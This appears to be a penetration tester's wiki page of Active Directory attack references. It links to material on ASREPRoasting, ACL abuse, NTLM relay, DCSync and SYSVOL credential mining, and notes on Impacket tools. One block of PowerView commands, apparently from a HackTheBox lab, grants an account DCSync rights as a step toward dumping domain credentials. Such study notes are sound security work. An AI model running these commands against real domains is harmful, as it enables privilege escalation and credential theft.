---
layout: wiki
title: Internals - Active Directory Resources
cate1: Internal
cate2: Active Directory
description: Notes about Active Directory
keywords: Internals
---

# Active Directory Exploitation Strategies
 - [ASREPRoasting via Impacket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
 - **WriteDACL**
   - [WriteDACL - BloodHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312765477787-WriteDacl)
 - [Abusing Active Directory ACLs/ACEs](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)
 - [NTLMRelay](https://www.thehacker.recipes/ad/movement/ntlm/relay)
 - [DCSync - secretsdump](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
   - **With PowerView**:
    ```
    whoami /all
    Add-ADGroupMember -Identity "Exchange Windows Permissions" -members svc-alfresco
    net group "Exchange Windows Permissions" /add svc-alfresco
    Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
    Add-ObjectACL -PrincipalIdentity test123 -Credential $cred -Rights DCSync
    Get-DomainUser -Identity svc-alfresco
    Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object { $_.IdentityReference -match "svc-alfresco" }
    ```
 - [SYSVOL Group Policy Credential Mining](https://adsecurity.org/?p=2288)
## Active Directory Tools
 - [PowerView (Deprecated since 2021)](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
   -  ```. .\powerview.ps1```
 - [BloodHound CE](https://github.com/SpecterOps/BloodHound)
 - 
## Impacket Tools
  - **PSExec**
    - Shell access via SMB shares (Pass the Hash) 
  - **GetNPUsers**
    - Kerberos Pre-authentication disabled (ASREPRoasting)
 
## Resources
 - [The Hacker Recipes](https://www.thehacker.recipes/)
